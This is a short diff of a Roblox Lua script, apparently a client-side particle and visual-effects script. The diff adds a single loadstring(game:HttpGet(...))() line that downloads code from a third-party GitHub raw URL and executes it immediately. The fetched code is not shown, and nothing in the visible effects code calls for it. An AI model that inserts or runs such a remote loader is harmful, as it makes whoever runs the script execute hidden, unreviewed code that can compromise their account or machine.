@@ -1050,6 +1050,9 @@ collateral4.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]
             child:Emit(10) -- Emit 20 particles
         end
     end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Name%20base%20move%20jun'))()
+
     end
 
 end
